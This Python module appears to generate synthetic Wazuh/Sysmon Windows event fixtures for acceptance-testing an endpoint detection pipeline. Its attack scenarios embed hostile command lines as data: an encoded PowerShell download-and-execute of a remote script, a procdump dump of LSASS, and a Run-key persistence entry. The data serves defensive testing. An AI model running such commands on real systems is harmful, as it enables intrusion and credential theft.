from __future__ import annotations

import json
import random
from collections.abc import Iterator
from datetime import UTC, datetime, timedelta
from typing import Any

ACCEPTANCE_SEED = 20260817
ACCEPTANCE_SCENARIOS = (
    "benign_admin_powershell",
    "benign_software_installation",
    "benign_rmm_remote_maintenance",
    "powershell_download_execute",
    "lsass_access_with_context",
    "registry_runkey_persistence",
    "remote_service_and_task",
    "degraded_telemetry",
    "noisy_workstation",
)

_BASE_TIME = datetime(2024, 1, 3, 10, 0, tzinfo=UTC)


def _iso(offset: int) -> str:
    return (_BASE_TIME + timedelta(seconds=offset)).isoformat().replace("+00:00", "Z")


def make_hit(
    *,
    document_id: str,
    offset: int,
    event_id: int,
    eventdata: dict[str, Any],
    host: str = "WS-ACCEPT-01",
    agent_id: str = "101",
    agent_ip: str = "10.20.0.21",
    provider: str | None = None,
) -> dict[str, Any]:
    timestamp = _iso(offset)
    security_event = event_id in {4624, 4697, 4698}
    return {
        "_index": "wazuh-archives-4.x-acceptance",
        "_id": document_id,
        "_source": {
            "@timestamp": timestamp,
            "timestamp": timestamp,
            "agent": {"id": agent_id, "name": host, "ip": agent_ip},
            "rule": {
                "id": f"acceptance-{event_id}",
                "level": 3,
                "description": f"Acceptance event {event_id}",
                "groups": ["windows", "windows_security" if security_event else "sysmon"],
            },
            "data": {
                "win": {
                    "system": {
                        "eventID": str(event_id),
                        "providerName": provider
                        or (
                            "Microsoft-Windows-Security-Auditing"
                            if security_event
                            else "Microsoft-Windows-Sysmon"
                        ),
                        "channel": (
                            "Security"
                            if security_event
                            else "Microsoft-Windows-Sysmon/Operational"
                        ),
                        "computer": f"{host}.example.test",
                        "eventRecordID": str(1000 + offset),
                    },
                    "eventdata": eventdata,
                }
            },
        },
    }


def _process(
    document_id: str,
    offset: int,
    guid: str,
    image: str,
    command_line: str,
    *,
    pid: int,
    parent_guid: str = "{EXPLORER}",
    parent_image: str = r"C:\Windows\explorer.exe",
    host: str = "WS-ACCEPT-01",
    agent_id: str = "101",
    agent_ip: str = "10.20.0.21",
) -> dict[str, Any]:
    return make_hit(
        document_id=document_id,
        offset=offset,
        event_id=1,
        host=host,
        agent_id=agent_id,
        agent_ip=agent_ip,
        eventdata={
            "ProcessGuid": guid,
            "ProcessId": pid,
            "Image": image,
            "CommandLine": command_line,
            "ParentProcessGuid": parent_guid,
            "ParentProcessId": 900,
            "ParentImage": parent_image,
            "User": r"LAB\analyst",
        },
    )


def _linked(
    document_id: str,
    offset: int,
    event_id: int,
    guid: str,
    image: str,
    *,
    pid: int,
    extra: dict[str, Any],
    host: str = "WS-ACCEPT-01",
) -> dict[str, Any]:
    return make_hit(
        document_id=document_id,
        offset=offset,
        event_id=event_id,
        host=host,
        eventdata={
            "ProcessGuid": guid,
            "ProcessId": pid,
            "Image": image,
            "User": r"LAB\analyst",
            **extra,
        },
    )


def _security_sequence(*, include_task: bool, benign_name: bool = False) -> list[dict[str, Any]]:
    account = "rmm.operator" if benign_name else "svc.deploy"
    service_name = "ApprovedRMM" if benign_name else "RemoteUpdater"
    target_host = "APP-SRV-02"
    common = {
        "host": target_host,
        "agent_id": "102",
        "agent_ip": "10.20.0.22",
    }
    rows = [
        make_hit(
            document_id="target-logon-4624",
            offset=10,
            event_id=4624,
            eventdata={
                "TargetUserName": account,
                "TargetDomainName": "LAB",
                "TargetLogonId": "0x6a19f",
                "LogonType": "3",
                "WorkstationName": "ADMIN-WS-01",
                "IpAddress": "10.20.0.21",
                "IpPort": "52144",
                "AuthenticationPackageName": "Kerberos",
            },
            **common,
        ),
        make_hit(
            document_id="target-service-4697",
            offset=40,
            event_id=4697,
            eventdata={
                "SubjectUserName": account,
                "SubjectDomainName": "LAB",
                "SubjectLogonId": "0x6A19F",
                "ServiceName": service_name,
                "ServiceFileName": rf"C:\ProgramData\{service_name}\agent.exe --service",
                "ServiceType": "0x10",
                "ServiceStartType": "2",
                "ServiceAccount": "LocalSystem",
            },
            **common,
        ),
        _process(
            "source-admin-process",
            5,
            "{SOURCE-ADMIN}",
            r"C:\Windows\System32\mmc.exe",
            "mmc.exe services.msc",
            pid=1800,
            host="ADMIN-WS-01",
            agent_id="101",
            agent_ip="10.20.0.21",
        ),
    ]
    if include_task:
        rows.insert(
            0,
            make_hit(
                document_id="target-task-4698",
                offset=50,
                event_id=4698,
                eventdata={
                    "SubjectUserName": account,
                    "SubjectDomainName": "LAB",
                    "SubjectLogonId": "0x6A19F",
                    "TaskName": r"\Microsoft\Windows\RemoteUpdater",
                    "TaskContent": "<Task><Actions><Exec><Command>cmd.exe</Command></Exec></Actions></Task>",
                    "ClientProcessId": "0x7d0",
                    "ParentProcessId": "0x2f4",
                },
                **common,
            ),
        )
    return rows


def scenario_hits(name: str) -> list[dict[str, Any]]:
    if name == "benign_admin_powershell":
        guid = "{BENIGN-PS}"
        return [
            _process(
                "benign-ps",
                1,
                guid,
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "powershell.exe Get-Service | Where-Object Status -eq Running",
                pid=1200,
            ),
            _linked(
                "benign-ps-file",
                2,
                11,
                guid,
                r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                pid=1200,
                extra={"TargetFilename": r"C:\Windows\Temp\service-inventory.csv"},
            ),
        ]
    if name == "benign_software_installation":
        guid = "{BENIGN-MSI}"
        return [
            _process(
                "benign-msi",
                1,
                guid,
                r"C:\Windows\System32\msiexec.exe",
                "msiexec.exe /i approved-agent.msi /qn",
                pid=1300,
            ),
            _linked(
                "benign-msi-file",
                2,
                11,
                guid,
                r"C:\Windows\System32\msiexec.exe",
                pid=1300,
                extra={"TargetFilename": r"C:\Program Files\Approved Agent\agent.exe"},
            ),
            make_hit(
                document_id="benign-service",
                offset=3,
                event_id=4697,
                eventdata={
                    "SubjectUserName": "installer",
                    "SubjectDomainName": "LAB",
                    "SubjectLogonId": "0x111",
                    "ServiceName": "ApprovedAgent",
                    "ServiceFileName": r"C:\Program Files\Approved Agent\agent.exe",
                },
            ),
        ]
    if name == "benign_rmm_remote_maintenance":
        return _security_sequence(include_task=False, benign_name=True)
    if name == "powershell_download_execute":
        guid = "{SUSPICIOUS-PS}"
        image = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        return [
            _process(
                "ps-download",
                1,
                guid,
                image,
                "powershell.exe -NoProfile -EncodedCommand SQBFAFgA; iwr https://203.0.113.25/a.ps1",
                pid=1400,
                parent_guid="{OFFICE}",
                parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
            ),
            _linked(
                "ps-file",
                2,
                11,
                guid,
                image,
                pid=1400,
                extra={"TargetFilename": r"C:\Users\analyst\AppData\Local\Temp\stage.ps1"},
            ),
            _linked(
                "ps-dns",
                3,
                22,
                guid,
                image,
                pid=1400,
                extra={"QueryName": "download.example.test", "QueryStatus": "0"},
            ),
            _linked(
                "ps-network",
                4,
                3,
                guid,
                image,
                pid=1400,
                extra={"DestinationIp": "203.0.113.25", "DestinationPort": 443},
            ),
            _process(
                "ps-child",
                5,
                "{PS-CHILD}",
                r"C:\Windows\System32\rundll32.exe",
                "rundll32.exe C:\\Users\\analyst\\AppData\\Local\\Temp\\stage.dll,Start",
                pid=1401,
                parent_guid=guid,
                parent_image=image,
            ),
        ]
    if name == "lsass_access_with_context":
        guid = "{PROC-DUMP}"
        image = r"C:\Tools\procdump.exe"
        return [
            _process("lsass-source", 1, guid, image, "procdump.exe -ma lsass.exe", pid=1500),
            make_hit(
                document_id="lsass-access",
                offset=2,
                event_id=10,
                eventdata={
                    "SourceProcessGuid": guid,
                    "SourceProcessId": 1500,
                    "SourceImage": image,
                    "TargetProcessGuid": "{LSASS}",
                    "TargetProcessId": 700,
                    "TargetImage": r"C:\Windows\System32\lsass.exe",
                    "GrantedAccess": "0x1010",
                    "SourceUser": r"LAB\analyst",
                },
            ),
        ]
    if name == "registry_runkey_persistence":
        guid = "{REG-PROC}"
        image = r"C:\Windows\System32\reg.exe"
        return [
            _process(
                "reg-source",
                1,
                guid,
                image,
                r"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater",
                pid=1600,
            ),
            _linked(
                "reg-runkey",
                2,
                13,
                guid,
                image,
                pid=1600,
                extra={
                    "EventType": "SetValue",
                    "TargetObject": r"HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\Updater",  # pragma: allowlist secret
                    "Details": r"C:\Users\analyst\AppData\Roaming\updater.exe",
                },
            ),
        ]
    if name == "remote_service_and_task":
        return _security_sequence(include_task=True)
    if name == "degraded_telemetry":
        missing_parent = _process(
            "degraded-process",
            20,
            "{DEGRADED}",
            r"C:\Windows\System32\cmd.exe",
            "cmd.exe /c echo collected",
            pid=1700,
            parent_guid="{MISSING-PARENT}",
        )
        duplicate = json.loads(json.dumps(missing_parent))
        duplicate["_id"] = "degraded-process-duplicate"
        unsupported = make_hit(
            document_id="unsupported",
            offset=18,
            event_id=9999,
            eventdata={"Value": "unsupported"},
        )
        invalid_time = make_hit(
            document_id="invalid-time",
            offset=19,
            event_id=1,
            eventdata={
                "ProcessGuid": "{INVALID-TIME}",
                "ProcessId": 1701,
                "Image": r"C:\Windows\System32\whoami.exe",
            },
        )
        invalid_time["_source"]["@timestamp"] = "not-a-timestamp"
        invalid_time["_source"]["timestamp"] = "also-invalid"
        return [missing_parent, unsupported, invalid_time, duplicate]
    if name == "noisy_workstation":
        return list(iter_mixed_hits(5000, seed=ACCEPTANCE_SEED))
    raise ValueError(f"Unknown acceptance scenario: {name}")


def iter_scenario_lines(name: str) -> Iterator[bytes]:
    rows = scenario_hits(name)
    if name == "degraded_telemetry":
        # Deliberately out of chronological order with a syntax-level rejection.
        yield json.dumps(rows[1], sort_keys=True).encode("utf-8") + b"\n"
        yield b'{"malformed":\n'
        yield json.dumps(rows[0], sort_keys=True).encode("utf-8") + b"\n"
        yield json.dumps(rows[2], sort_keys=True).encode("utf-8") + b"\n"
        yield json.dumps(rows[3], sort_keys=True).encode("utf-8") + b"\n"
        return
    for row in rows:
        yield json.dumps(row, sort_keys=True, separators=(",", ":")).encode("utf-8") + b"\n"


def iter_mixed_hits(count: int, *, seed: int = ACCEPTANCE_SEED) -> Iterator[dict[str, Any]]:
    """Generate deterministic mixed endpoint noise with one recoverable suspicious chain."""
    if count < 0:
        raise ValueError("count cannot be negative")
    rng = random.Random(seed)
    chain = scenario_hits("powershell_download_execute")
    yield from chain[:count]
    for index in range(len(chain), count):
        guid = f"{{NOISE-{index:08d}}}"
        pid = 2000 + index
        offset = index + 100
        kind = index % 4
        if kind == 0:
            yield _process(
                f"noise-process-{index}",
                offset,
                guid,
                r"C:\Program Files\Browser\browser.exe",
                f"browser.exe --background-task={index}",
                pid=pid,
            )
        elif kind == 1:
            yield _linked(
                f"noise-network-{index}",
                offset,
                3,
                guid,
                r"C:\Program Files\Browser\browser.exe",
                pid=pid,
                extra={
                    "DestinationIp": f"198.51.100.{1 + rng.randrange(200)}",
                    "DestinationPort": 443,
                },
            )
        elif kind == 2:
            yield _linked(
                f"noise-dns-{index}",
                offset,
                22,
                guid,
                r"C:\Program Files\Browser\browser.exe",
                pid=pid,
                extra={"QueryName": f"cdn-{rng.randrange(50)}.example.test"},
            )
        else:
            yield _linked(
                f"noise-file-{index}",
                offset,
                11,
                guid,
                r"C:\Windows\System32\msiexec.exe",
                pid=pid,
                extra={"TargetFilename": rf"C:\Program Files\Approved\cache-{index}.dat"},
            )
